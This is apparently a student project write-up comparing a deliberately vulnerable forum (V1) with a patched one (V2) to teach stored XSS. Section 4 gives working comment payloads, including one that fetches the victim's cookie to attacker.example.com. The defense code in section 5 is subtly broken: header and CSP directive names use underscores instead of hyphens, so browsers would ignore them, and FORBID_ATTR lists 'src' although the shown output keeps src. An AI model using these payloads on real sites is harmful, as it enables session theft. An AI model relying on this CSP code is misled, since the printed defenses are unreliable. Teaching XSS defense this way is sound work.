# Comprehensive Technical Explanations of Stored Cross Site Scripting and Defense:

## 1. Executive Summary of the Project:
1. This project investigates and demonstrates Problem 1: Stored Cross Site Scripting (XSS) within a modern fullstack web forum developed for the IIIT Allahabad Open Source Community.
2. The project delivers two separate editions of the application to facilitate a direct side by side security comparison.
3. The first edition, located in folder IIITAOSCommunityForumV1, contains deliberate code flaws that allow persistent script injection.
4. The second edition, located in folder IIITAOSCommunityForumV2, implements a robust defense in depth strategy that neutralizes all stored payloads.

## 2. Directory Structure and Component Breakdown:

### 2.1 Directory IIITAOSCommunityForumV1 (Vulnerable Edition):
1. Purpose: Implements the initial version of the forum where user submitted inputs are accepted without sanitization and rendered directly into the browser DOM.
2. Backend (server/): Contains server.js, database.js, routes/auth.js, routes/posts.js, and routes/chat.js without security headers or input filtering.
3. Frontend (client/): Contains App.jsx and ContentRenderer.jsx which inserts raw HTML strings into the DOM via innerHTML.
4. Storage: Embedded SQLite database forum.db storing discussion posts, comments, live chat messages, and user biographies.
5. Documentation: Contains ReadMe.md and Vulnerable.md.

### 2.2 Directory IIITAOSCommunityForumV2 (Secured Edition):
1. Purpose: Implements the patched version of the forum where all Cross Site Scripting vectors are completely neutralized.
2. Backend (server/): Configures Content Security Policy response headers in server.js and enables the HttpOnly attribute on authentication cookies in routes/auth.js.
3. Frontend (client/): Utilizes DOMPurify within ContentRenderer.jsx to sanitize all user markup before writing to the DOM.
4. Storage: Embedded SQLite database forum.db operating alongside the sanitized rendering pipeline.
5. Documentation: Contains ReadMe.md and XSSAttackDefense.md.

## 3. Detailed Analysis of the Stored XSS Flaw in Version 1:

### 3.1 What is Stored Cross Site Scripting:
1. Definition: Stored Cross Site Scripting occurs when an application receives untrusted input from a user, writes that input into persistent storage such as a database, and later presents it to other users without adequate output neutralization.
2. Autonomous Triggering: Unlike Reflected XSS which requires victims to click a specially crafted URL, Stored XSS executes automatically whenever any user simply visits the affected page.
3. Elevated Risk for Administrators: If an administrator opens a discussion thread or inspects a member profile containing a stored payload, the script executes with full administrative privileges.

### 3.2 Where the Code Flaws Exist in Version 1:
1. Backend Ingestion Flaw (server/routes/posts.js): The endpoint POST /api/posts/:id/comments takes the raw string from the request body and writes it into the SQLite comments table using an SQL query without stripping HTML tags.
2. Frontend Injection Flaw (client/src/components/ContentRenderer.jsx): In order to support rich text formatting such as bold text and code snippets, the component sets containerRef.current.innerHTML = content. When the browser parses this HTML string, any embedded JavaScript or event handlers execute immediately.
3. Insecure Cookie Flaw (server/routes/auth.js): The login and registration routes set the authentication cookie session_token with httpOnly set to false, meaning client scripts can freely read the cookie via document.cookie.

## 4. How to Execute a Stored XSS Attack on Version 1:

### 4.1 Step by Step Attack Walkthrough:
1. Step 1: An attacker logs into the forum using the account credentials for lucky with password lucky123.
2. Step 2: The attacker navigates to the first discussion thread titled Welcome to the IIITA Open Source Community Forum.
3. Step 3: In the Leave a Comment form, the attacker submits an image tag containing an intentional error event handler.
4. Attack Payload Example: <img src="invalid_image" onerror="alert('Stored XSS Executed! Session Cookie: ' + document.cookie)">.
5. Step 4: The Express backend accepts the request and inserts the string into the SQLite database table comments.
6. Step 5: A victim user such as Mridankan Mandal (Administrator) logs in and opens the same discussion thread.
7. Step 6: The victim browser requests the discussion comments from the API and renders the comment into the DOM using innerHTML.
8. Step 7: The browser attempts to load the image from invalid_image, fails, and immediately triggers the JavaScript code in the onerror attribute.
9. Step 8: An alert dialog pops up on the administrator screen displaying the active session cookie value, proving complete arbitrary JavaScript execution.

### 4.2 Advanced Attack Scenario: Silent Cookie Exfiltration:
1. Payload: <img src="x" onerror="fetch('https://attacker.example.com/log?cookie=' + encodeURIComponent(document.cookie))">.
2. Explanation: Instead of displaying a visible alert box, the payload uses the fetch API in the background to quietly transmit the victim session cookie to an external server controlled by the attacker.
3. Outcome: The attacker obtains the administrator session identifier and can hijack the administrator account without knowing their password.

## 5. Detailed Breakdown of the Defense Mechanisms in Version 2:

### 5.1 Defense 1: Client Side DOM Sanitization via DOMPurify:
1. Implementation Location: In file IIITAOSCommunityForumV2/client/src/components/ContentRenderer.jsx.
2. How It Operates: Before any user content is written to the DOM, it is passed through the DOMPurify library.
3. Sanitization Rule: DOMPurify explicitly strips all script tags, iframe tags, and event attributes such as onerror, onload, and onclick while preserving benign formatting tags like strong, em, and code.
4. Code Implementation:
const cleanHtml = DOMPurify.sanitize(content, { ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'u', 'p', 'br', 'code', 'pre', 'ul', 'ol', 'li', 'blockquote', 'span'], FORBID_TAGS: ['script', 'iframe', 'object', 'embed'], FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'src'] });
containerRef.current.innerHTML = cleanHtml;

### 5.2 Defense 2: Session Cookie Hardening with HttpOnly:
1. Implementation Location: In file IIITAOSCommunityForumV2/server/routes/auth.js.
2. How It Operates: The server configures the authentication cookie with httpOnly true and sameSite strict.
3. Code Implementation:
res.cookie('session_token', token, { httpOnly: true, sameSite: 'strict', path: '/' });
4. Security Impact: The browser strictly prevents client JavaScript from accessing document.cookie. Even if a script injection were to occur, the cookie remains hidden from the attacker.

### 5.3 Defense 3: Content Security Policy Headers:
1. Implementation Location: In file IIITAOSCommunityForumV2/server/server.js.
2. How It Operates: The Express server attaches HTTP security headers to all outgoing responses.
3. Code Implementation:
res.setHeader('Content_Security_Policy', "default_src 'self'; script_src 'self'; style_src 'self' 'unsafe_inline'; img_src 'self' data: https:; connect_src 'self';");
res.setHeader('X_Content_Type_Options', 'nosniff');
res.setHeader('X_Frame_Options', 'DENY');
4. Security Impact: The browser enforces a strict policy that disallows the execution of unauthorized inline scripts or external unauthorized network connections.

## 6. Demonstration of Attack Neutralization in Version 2:

### 6.1 Testing the Payload on Version 2:
1. The attacker submits the identical payload: <img src="invalid_image" onerror="alert('Stored XSS')">.
2. In Version 2, when the administrator opens the discussion thread, ContentRenderer passes the string to DOMPurify.
3. DOMPurify detects the unauthorized onerror attribute and completely removes it.
4. The sanitized output rendered to the DOM is simply: <img src="invalid_image">.
5. The browser fails to load the image, but because the onerror attribute was deleted, no JavaScript executes and no alert dialog appears.

### 6.2 Testing Cookie Theft on Version 2:
1. If an attacker attempts to execute document.cookie, the browser returns an empty string because the cookie is marked HttpOnly.
2. Furthermore, any attempt to transmit data to an external domain is blocked by the Content Security Policy.

## 7. Direct Technical Comparison Between Version 1 and Version 2:
1. User Input Storage: Both versions use SQLite 3 parameterized queries to store data safely against SQL injection.
2. DOM Insertion Technique: Version 1 uses unneutralized innerHTML while Version 2 uses DOMPurify sanitized innerHTML.
3. Cookie Security: Version 1 has httpOnly set to false while Version 2 has httpOnly set to true.
4. Browser Security Headers: Version 1 sends no CSP headers while Version 2 enforces Content Security Policy and X Content Type Options headers.
5. Attack Outcome: In Version 1, Stored XSS executes automatically and compromises session tokens. In Version 2, all payloads are completely neutralized and user sessions remain secure.
